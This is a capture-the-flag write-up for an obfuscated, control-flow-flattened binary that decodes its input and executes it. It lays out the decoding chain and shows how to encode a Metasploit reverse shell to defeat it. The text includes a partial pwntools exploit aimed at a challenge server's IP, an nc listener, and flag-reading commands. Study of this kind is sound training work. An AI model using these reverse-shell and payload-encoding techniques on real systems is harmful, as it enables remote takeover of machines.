# solution
The first impression of the binary will be very daunting for the user. Opening it in IDA reveals a massive graph due to the control flow flattening. 

The best approach is to send a known buffer (e.g. 0x41414141....) and very closely observe what's happening to it (i.e. singlestepping the binary in debug mode) to find out what kind of operations are performed to the input and to understand how to undo them.

Sequence of operations on input:

- offsets the value of the input byte by byte by -13 (in order to ease the sending of encoded shellcode -> all bytes are highly unlikely to not interfere with \n, \r, \0.
- bitwise rot left buffer in parts of 32 bit by 21 bit
- base64 decode the result of the previous step (i.e. the rot reveals an ASCII printable buffer if done correctly). 
- bitwise rot right buffer in parts of 32 bit by 7 bit
- bitwise NOT the result of the previous step
- New: Additional twirling with: not, offset +23, not, rot 23, not, rot -23, offset -23 --> Just for confusing, does not really change the decoding!
- xor the buffer of the previous step using a lookup table and a length-dependant index-calculation

The shellcode to execute can be a simple Metasploit reverse shell tcp shellcode. See 'exploit/create_shellcode.sh' for an example command to generate a reverse shell to LHOST and LPORT. 

The file 'exploit/exploit.py' shows a sample python3 program to run against the local/remote target.


# steps
1. change IP/port of target in docker-cheater/app/create_shellcode.sh 
2. `cd docker-cheater && docker-compose build && docker-compose up -d`
3. connect to docker: `nc localhost 2399`
4. copy shellcode from output (`python3 -c 'print("\x9e\xaf\xaf\x68\ [...]`)
5. on the target machine, run nc in listening mode: `nc -lvp 4444`
5. run a simple python script using pwntools:  
    ```
    from pwn import *
    context.update(arch='i686', os='linux')
    p = remote("206.81.21.185", 2309) # ch.hackyeaster.com
    p.sendline("\x9e\xaf\xaf\x68 [...] ")
    ```
6. shell on the target machine -> `ls`
    - search flag file -> in `/fl@gst0r3/flag`
    - `cat /fl@gst0r3/flag`

# build
- Use cheater to generate/test the encoded payload. 
- Generate shellcode with e.g. msfvenom and name it shellcode.bin in the current (hell) directory.
    - Use exploit/create_shellcode.sh for doing so for example
- Run "cheater". It will read shellcode.bin and perform the forward obencoding and print an example buf/python demo code to exploit the binary
- If you copy the python demo code and start cheater using this piped input, you can directly print and pwn the binary for testing.
- It is recommended to use the pwndebug / raw buffer approach, cause your terminal might inject some additional characters into the stream making the binary crash (you'll see in the buffer debug printout).
- Run exploit.py from the root of the challenge directory


# description
The binary reads user input from stdin (or network connection) and performs some operations on it (value add/sub, rol/ror, xor, base64 with custom alphabet, not). The resulting buffer is then dynamically executed like shellcode.

The idea is to create shellcode for e.g. a reverse shell, reverse the decoding operations the binary does and provide the binary with a byte stream as input. When the binary decodes the stream, in the end the shellcode should reside in memory ready for execution and gets called -> Pwned!

What makes this challenge extra hard is:

- Inlining of functions: i.e. the arithmetic operations cannot be clearly seperated into individual functions and analysed by themselves or called directly using DBI
- Custom base64 alphabet so that even if base64 is properly recognized the naive approach will fail in en/decoding
- Avoidance of standard libc functions e.g. for strlen() and coding it by hand to make it harder to recognize the flow
- and of course: hellscape control-flow-flattening